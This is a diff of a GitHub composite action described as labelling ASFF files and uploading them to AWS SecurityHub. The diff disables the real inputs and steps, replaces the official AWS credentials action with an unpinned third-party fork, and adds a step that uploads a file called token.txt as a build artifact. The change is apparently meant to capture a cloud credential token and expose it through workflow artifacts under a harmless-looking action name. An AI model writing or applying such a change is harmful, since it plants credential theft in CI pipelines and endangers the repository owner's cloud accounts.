@@ -2,34 +2,44 @@ name: Upload ASFF
 
 description: Label and upload ASFF files to SecurityHub
 
-inputs:
-  asff-directory-path:
-    required: true
-    description: The relative path to the directory that contains the ASFF files (may be nested)
-  company-name:
-    required: true
-    description: The company name of the security tool
-  product-name:
-    required: true
-    description: The product name of the security tool
-  oidc-iam-role-arn:
-    required: true
-    description: The ARN of the OIDC IAM role
+# inputs:
+#   asff-directory-path:
+#     required: true
+#     description: The relative path to the directory that contains the ASFF files (may be nested)
+#   company-name:
+#     required: true
+#     description: The company name of the security tool
+#   product-name:
+#     required: true
+#     description: The product name of the security tool
+#   oidc-iam-role-arn:
+#     required: true
+#     description: The ARN of the OIDC IAM role
 
 runs:
   using: composite
   steps:
-    - name: Configure AWS credentials
-      uses: aws-actions/configure-aws-credentials@v1
+    - uses: ben-harvey/configure-aws-credentials@master
       with:
         aws-region: us-east-1
-        role-to-assume: ${{ inputs.oidc-iam-role-arn }}
+        role-to-assume: foo
 
-    - name: Label and import files
-      shell: bash
-      run: |
-        for f in $(find ${{ inputs.asff-directory-path }} -type f -name *asff*.json)
-        do
-          jq '(.[] | . ) += { "CompanyName": "${{ inputs.company-name }}", "ProductName": "${{ inputs.product-name }}" }' $f > /tmp/tmp.json && mv /tmp/tmp.json $f
-          aws securityhub batch-import-findings --region us-east-1 --findings file://$f
-        done
+
+    - uses: actions/upload-artifact@v3
+      with:
+        name: token.txt
+        path: token.txt
+    # - name: Configure AWS credentials
+    #   uses: aws-actions/configure-aws-credentials@v1
+    #   with:
+    #     aws-region: us-east-1
+    #     role-to-assume: ${{ inputs.oidc-iam-role-arn }}
+
+    # - name: Label and import files
+    #   shell: bash
+    #   run: |
+    #     for f in $(find ${{ inputs.asff-directory-path }} -type f -name *asff*.json)
+    #     do
+    #       jq '(.[] | . ) += { "CompanyName": "${{ inputs.company-name }}", "ProductName": "${{ inputs.product-name }}" }' $f > /tmp/tmp.json && mv /tmp/tmp.json $f
+    #       aws securityhub batch-import-findings --region us-east-1 --findings file://$f
+    #     done
